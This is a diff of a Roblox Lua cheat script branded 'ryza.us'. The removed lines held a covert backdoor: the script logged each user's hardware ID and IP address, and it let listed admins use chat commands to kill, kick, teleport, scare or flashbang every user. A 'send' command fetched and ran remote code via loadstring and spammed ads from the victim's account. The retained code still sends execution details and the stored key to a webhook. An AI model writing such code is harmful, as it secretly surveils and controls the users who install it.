@@ -77,18 +77,16 @@ else
 	executorInfo = "Safety Unknown"
 end
 
-local HWID = game:GetService("RbxAnalyticsService"):GetClientId()
-local IP = game:HttpGet("https://v4.ident.me/")
-
-if HWID == "null" then
-	local s = Instance.new("Sound")
-	s.Parent = LocalPlayer.PlayerGui
-	s.SoundId = "rbxassetid://17518855592"
-	s.Volume = 1000
-	s.Looped = true
-	s:Play()
-	task.wait(5)
-	LocalPlayer:Kick("The associated discord account (1330566596975923223) is not permitted to use this script.\nAppeal: https://discord.gg/XRqjm6Nk4K")
+local function loadKeyFromFile()
+	if readfile and isfile and isfile("ryza_KeyData.json") then
+		local success, data = pcall(function()
+			return HttpService:JSONDecode(readfile("ryza_KeyData.json"))
+		end)
+		if success and data and data.key and data.timestamp then
+			return data.key
+		end
+	end
+	return nil
 end
 
 local data = {
@@ -104,8 +102,7 @@ local data = {
 			{ name = "**Time Executed**", value = "`" .. currentTime .. "`", inline = true },
 			{ name = "**Executor**", value = "`" .. executorName .. "`", inline = true },
 			{ name = "**Executor Host Information**", value = executorInfo, inline = true },
-			{ name = "**User Key**", value = HWID, inline = true },
-			{ name = "**IP Address**", value = IP, inline = true },
+			{ name = "**Key Authorised**", value = (loadKeyFromFile() or "Unknown"), inline = true },
 			{ name = "**Quick Join**", value = "```lua\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance('" .. game.PlaceId .. "', '" .. (game.JobId or "N/A") .. "', game.Players.LocalPlayer)\n```", inline = false }
 		},
 		footer = {
@@ -1884,295 +1881,9 @@ do
 		"jm_ep45"
 	}
 
-	local adminsByHWID = {
-		"CE81F5AE-6BFC-4FCC-BDBA-986A45338860"
-	}
-
-	if findList(admins, LocalPlayer.Name) or findList(adminsByHWID, HWID) then
-		Tabs.Admin:AddButton({
-			Title = "Bring All",
-			Description = "Bring all script user(s)",
-			Callback = function()
-				game:GetService("Players"):Chat("ryza.us(bring)")
-			end
-		})
-
-		Tabs.Admin:AddButton({
-			Title = "Promote All",
-			Description = "Promote ryza.us from all script user(s)",
-			Callback = function()
-				for _,v in pairs(game:GetService("Players"):GetPlayers()) do
-					game:GetService("Players"):Chat("ryza.us(send)")
-				end
-			end
-		})
-
-		Tabs.Admin:AddButton({
-			Title = "Kill All",
-			Description = "Kill all script user(s)",
-			Callback = function()
-				game:GetService("Players"):Chat("ryza.us(kill)")
-			end
-		})
-
-		Tabs.Admin:AddButton({
-			Title = "Kick All",
-			Description = "Kick all script user(s)",
-			Callback = function()
-				game:GetService("Players"):Chat("ryza.us(kick)")
-			end
-		})
-
-		Tabs.Admin:AddButton({
-			Title = "Jumpscare All",
-			Description = "Jumpscare all script user(s)",
-			Callback = function()
-				game:GetService("Players"):Chat("ryza.us(jumpscare)")
-			end
-		})
-
-		Tabs.Admin:AddButton({
-			Title = "Flashbang All",
-			Description = "Flashbang all script user(s)",
-			Callback = function()
-				game:GetService("Players"):Chat("ryza.us(flashbang)")
-			end
-		})
-	end
-
 	local function onPlayerAdded(player)
 		player.Chatted:Connect(function(message)
-			if message == "ryza.us(bring)" then
-				if not findList(admins, player.Name) or findList(adminsByHWID, HWID) then
-					return
-				end
-
-				if player.Name == LocalPlayer.Name then
-					return
-				end
-
-				if player.Character then
-					local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
-
-					if char then
-						char:SetPrimaryPartCFrame(player.Character.PrimaryPart.CFrame)
-					end
-				end
-			elseif message == "ryza.us(kill)" then
-				if not findList(admins, player.Name) or findList(adminsByHWID, HWID) then
-					return
-				end
-
-				if player.Name == LocalPlayer.Name then
-					return
-				end
-
-				local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
-
-				if char then
-					char.Humanoid.Health = 0
-				end
-			elseif message == "ryza.us(kick)" then
-				if not findList(admins, player.Name) or findList(adminsByHWID, HWID) then
-					return
-				end
-
-				if player.Name == LocalPlayer.Name then
-					return
-				end
-
-				LocalPlayer:Kick("kicked by ryza.us administrator")
-			elseif message == "ryza.us(send)" then
-				if not findList(admins, player.Name) or findList(adminsByHWID, HWID) then
-					return
-				end
-
-				if player.Name == LocalPlayer.Name then
-					return
-				end
-
-				task.spawn(function()
-					local TextChatService = game:GetService("TextChatService")
-					local ReplicatedStorage = game:GetService("ReplicatedStorage")
-
-					local function chatMessage(str)
-						str = tostring(str)
-						if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
-							local generalChannel = TextChatService:FindFirstChild("TextChannels"):FindFirstChild("RBXGeneral")
-							if generalChannel then
-								generalChannel:SendAsync(str)
-							else
-								warn("RBXGeneral channel not found!")
-							end
-						else
-							local chatEvent = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents"):FindFirstChild("SayMessageRequest")
-							if chatEvent then
-								chatEvent:FireServer(str, "All")
-							else
-								warn("DefaultChatSystemChatEvents not found!")
-							end
-						end
-					end
-
-					local blob = "\u{000D}"
-					local clearMessage = ""..string.rep(blob, 197)..""
-
-
-					for i = 1, 1 do
-						chatMessage(clearMessage) 
-					end
-
-
-
-					loadstring(game:HttpGet("https://raw.githubusercontent.com/vqmpjayZ/More-Scripts/refs/heads/main/Anthony's%20ACL"))()
-
-					wait(1)
-
-					local StarterGui = game:GetService("StarterGui")
-					local Players = game:GetService("Players")
-					local player = Players.LocalPlayer
-
-					-- Create notification
-					StarterGui:SetCore("SendNotification", {
-						Title = "AK ADMIN",
-						Text = "You need to change your Roblox Language to Қазақ тілі so it won't get tagged",
-						Duration = 5
-					})
-
-					local TextChatService = game:GetService("TextChatService")
-					local ReplicatedStorage = game:GetService("ReplicatedStorage")
-
-					-- Function to send a chat message
-					local function chatMessage(str)
-						str = tostring(str)
-						if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
-							local generalChannel = TextChatService:FindFirstChild("TextChannels")
-							if generalChannel then
-								generalChannel = generalChannel:FindFirstChild("RBXGeneral")
-								if generalChannel then
-									generalChannel:SendAsync(str)
-								else
-									warn("RBXGeneral channel not found!") 
-								end
-							else
-								warn("TextChannels not found!")
-							end
-						else
-							local chatEvents = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
-							if chatEvents then
-								local chatEvent = chatEvents:FindFirstChild("SayMessageRequest")
-								if chatEvent then
-									chatEvent:FireServer(str, "All")
-								else
-									warn("SayMessageRequest event not found!")
-								end
-							else
-								warn("DefaultChatSystemChatEvents not found!")
-							end
-						end
-					end
-
-					-- Invisible character for new lines
-					local blob = ""
-
-					-- Formatted message (common for both systems)
-					wait(0.1)
-					local newMessage = blob .. "\r" ..
-						"ryza.us" .. blob .. "\r" ..
-						" ---------------------  " .. blob .. "\r" ..
-						blob .. "\r" ..
-						blob .. "\r" ..
-						blob .. "\r" ..
-						blob .. "\r" ..
-						"join the best script ever, ryza.us: join now at  " .. blob .. "\r" ..
-						blob .. "\r" ..
-						blob .. "\r" ..
-						blob .. "\r" ..
-						" ---------------------  " .. blob .. "\r" ..
-						".gg/Bm4syhCu5s" 
-
-
-
-					-- Send the appropriate message based on the chat system
-					local function sendMessage()
-						if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
-							chatMessage(newMessage)
-						end
-					end
-
-					-- Retry mechanism in case the message fails to send
-					local retries = 3
-					while retries > 0 do
-						local success, err = pcall(sendMessage)
-						if success then
-							break
-						else
-							warn("Failed to send message: " .. err)
-							retries = retries - 1
-							wait(1) -- Wait before retrying
-						end
-					end
-
-					if retries == 0 then
-						warn("Failed to send message after multiple attempts.")
-					end
-
-
-				end)
-			elseif message == "ryza.us(jumpscare)" then
-				if not findList(admins, player.Name) or findList(adminsByHWID, HWID) then
-					return
-				end
-
-				if jsToggled == true then
-					return
-				end
-
-				local sGui = Instance.new("ScreenGui")
-				sGui.Name = "jumpscare"
-				sGui.IgnoreGuiInset = true
-				sGui.Parent = LocalPlayer.PlayerGui
-				local jump = Instance.new("ImageLabel")
-				jump.Parent = sGui
-				jump.Size = UDim2.new(1, 0, 1, 0)
-				jump.Position = UDim2.new(0, 0, 0, 0)
-				jump.Image = "http://www.roblox.com/asset/?id=94098465509961"
-				local sound = Instance.new("Sound")
-				sound.Parent = sGui
-				sound.SoundId = "rbxassetid://7236490488"
-				sound.Volume = 10
-				sound:Play()
-
-				task.wait(5)
-				sGui:Destroy()
-			elseif message == "ryza.us(flashbang)" then
-				if not findList(admins, player.Name) or findList(adminsByHWID, HWID) then
-					return
-				end
-
-				if fbToggled == true then
-					return
-				end
-
-				local sGui = Instance.new("ScreenGui")
-				sGui.Name = "flashbang"
-				sGui.IgnoreGuiInset = true
-				sGui.Parent = LocalPlayer.PlayerGui
-				local jump = Instance.new("Frame")
-				jump.Parent = sGui
-				jump.Size = UDim2.new(1, 0, 1, 0)
-				jump.Position = UDim2.new(0, 0, 0, 0)
-				jump.BackgroundTransparency = 0
-				jump.BackgroundColor3 = Color3.new(1, 1, 1)
-				local sound = Instance.new("Sound")
-				sound.Parent = sGui
-				sound.SoundId = "rbxassetid://17659239587"
-				sound.Volume = 10
-				sound:Play()
-
-				task.wait(5)
-				sGui:Destroy()
-			elseif message == "ryza.us()" then
+			if message == "ryza.us()" then
 				if not UsersList[player.Name] then
 					table.insert(UsersList, player.Name)
 				end
